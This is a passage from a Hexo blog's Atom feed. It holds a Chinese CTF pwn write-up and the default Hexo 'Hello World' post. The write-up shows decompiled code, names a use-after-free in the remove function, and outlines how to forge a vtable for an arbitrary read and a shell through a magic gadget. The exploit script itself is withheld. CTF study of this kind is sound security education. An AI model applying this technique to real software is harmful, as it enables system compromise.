"</span>, <span class="number">0L</span>L);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0x7F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)(v0 + <span class="number">72</span>), <span class="number">0x80</span>uLL, <span class="string">"%s"</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)put_in_list(v0, <span class="number">128L</span>L) )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"New TV added."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v0 + <span class="number">16L</span>L))(v0);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><h3 id="add-movie"><a href="#add-movie" class="headerlink" title="add_movie"></a>add_movie</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_movie</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">float</span> v1; <span class="comment">// xmm1_4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-88h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">216u</span>LL);</span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span> *)v0, <span class="number">0</span>, <span class="number">0xD8</span>uLL);</span><br><span class="line">  *(_QWORD *)v0 = printf_movie;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Movie name? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0x3F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)(v0 + <span class="number">8</span>), <span class="number">0x40</span>uLL, <span class="string">"%s"</span>, &amp;v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Actors? "</span>);</span><br><span class="line">  *(_QWORD *)(v0 + <span class="number">208</span>) = sub_400CC0(); <span class="comment">//这里会额外申请一块内存放数据</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Rating? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0xF</span>uLL, <span class="number">10</span>);</span><br><span class="line">  v1 = strtod((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3, <span class="number">0L</span>L);</span><br><span class="line">  *(<span class="keyword">float</span> *)(v0 + <span class="number">200</span>) = v1;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Movie introduction? "</span>, <span class="number">0L</span>L);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0x7F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)(v0 + <span class="number">72</span>), <span class="number">0x80</span>uLL, <span class="string">"%s"</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)put_in_list(v0, <span class="number">128L</span>L) )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"New movie added."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v0 + <span class="number">16L</span>L))(v0);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="remove"><a href="#remove" class="headerlink" title="remove"></a>remove</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v1; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+0h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">0L</span>L;</span><br><span class="line">  v1 = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"TV/Movie name to remove? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v4, <span class="number">0x3F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = (<span class="keyword">const</span> <span class="keyword">char</span> *)list_table[v0];</span><br><span class="line">    <span class="keyword">if</span> ( v2 &amp;&amp; !<span class="built_in">strcmp</span>(v2 + <span class="number">8</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4) )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">      (*(<span class="keyword">void</span> (__fastcall **)(<span class="keyword">const</span> <span class="keyword">char</span> *, __int64 *))(*(_QWORD *)v2 + <span class="number">16L</span>L))(v2, &amp;v4);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v0 != <span class="number">32</span> );</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)v1 == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Not found."</span>);</span><br><span class="line">  list_table[v1] = <span class="number">0L</span>L;   <span class="comment">//这里只清0了最后一个</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Removed successfully"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞点是：remove那里可以批量删除name一样的，但是只清空了最后一个指针。</p><h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> (**v1)(<span class="keyword">const</span> <span class="keyword">char</span> *, ...); <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">1</span>;</span><br><span class="line">  v1 = (<span class="keyword">int</span> (**)(<span class="keyword">const</span> <span class="keyword">char</span> *, ...))list_table;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      (**(<span class="keyword">void</span> (***)(<span class="keyword">void</span>))*v1)();</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 != &amp;<span class="built_in">printf</span> );</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)result )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"No Movie/TV exists!"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h2><p>先创建3个名字一样的tv，然后都删掉，再创建一个movie，其中movie的actor会在堆中申请一片内存写入，我们可以通过actor，伪造一个movie，可以控制actor的指针，然后show的时候就可以任意地址读了。下面是movie打印信息的函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_4011B0</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(</span><br><span class="line">           <span class="string">"Movie &lt;%s&gt;: %s rating: %.2f actors: %s\n"</span>,</span><br><span class="line">           a1 + <span class="number">8</span>,</span><br><span class="line">           a1 + <span class="number">72</span>,</span><br><span class="line">           *(_QWORD *)(a1 + <span class="number">208</span>),  <span class="comment">//这里可以用来任意地址读</span></span><br><span class="line">           *(<span class="keyword">float</span> *)(a1 + <span class="number">200</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>通过这个方法可以泄露出malloc地址，以及list_table地址。（可以计算magic gadget）</p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>伪造movie的虚表vtable，使其指向我们可控的内存（泄露了heap地址，将magic gadget地址写入heap中就行了）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.rodata:00000000004015A0 ; `vtable for&apos;Movie</span><br><span class="line">.rodata:00000000004015A0 _ZTV5Movie      dq 0                    ; offset to this</span><br><span class="line">.rodata:00000000004015A8                 dq offset _ZTI5Movie    ; `typeinfo for&apos;Movie</span><br><span class="line">.rodata:00000000004015B0 printf_movie    dq offset sub_4011B0    ; DATA XREF: add_movie+24↑o  //改成magic地址</span><br><span class="line">.rodata:00000000004015B8                 dq offset nullsub_2</span><br><span class="line">.rodata:00000000004015C0                 dq offset j___ZdlPv     ; operator delete(void *)</span><br><span class="line">.rodata:00000000004015C8                 align 20h</span><br><span class="line">.rodata:00000000004015E0 ; `vtable for&apos;TV</span><br><span class="line">.rodata:00000000004015E0 _ZTV2TV         dq 0                    ; offset to this</span><br><span class="line">.rodata:00000000004015E8                 dq offset _ZTI2TV       ; `typeinfo for&apos;TV</span><br><span class="line">.rodata:00000000004015F0 printf_tv       dq offset sub_4011E0    ; DATA XREF: add_tv+24↑o</span><br><span class="line">.rodata:00000000004015F8                 dq offset nullsub_1</span><br><span class="line">.rodata:0000000000401600                 dq offset j___ZdlPv_0   ; operator delete(void *)</span><br></pre></td></tr></table></figure></p><p>show的时候，list_table的开头存放这vtable的地址，vtable的开头是打印函数，如果伪造vtable的指向magic，就可以直接getshell了。</p><p>本题没有提供libc，需要通过泄露地址的后3位来查找。<br><a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>暂时不放</p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>菜鸟乱写一通，看不懂不要喷，欢迎纠正。完成，撒花~~~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;blog已经搭了一段时间了，拖延症发作，一直没写。最近没做什么有意思的题，就写一下某CTF群的入群题解题思路。&lt;/p&gt;
&lt;h2 id=&quot;程序伪代码&quot;&gt;&lt;a href=&quot;#程序伪代码&quot; class=&quot;headerlink&quot; title=&quot;程序伪代码&quot;&gt;&lt;/a&gt;程序伪代码&lt;/h
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2018/01/16/hello-world/"/>
    <id>http://yoursite.com/2018/01/16/hello-world/</id>
    <published>2018-01-16T11:10:53.418Z</published>
    <updated>2018-01-16T11:10:53.418Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
  </entry>
  
</feed>
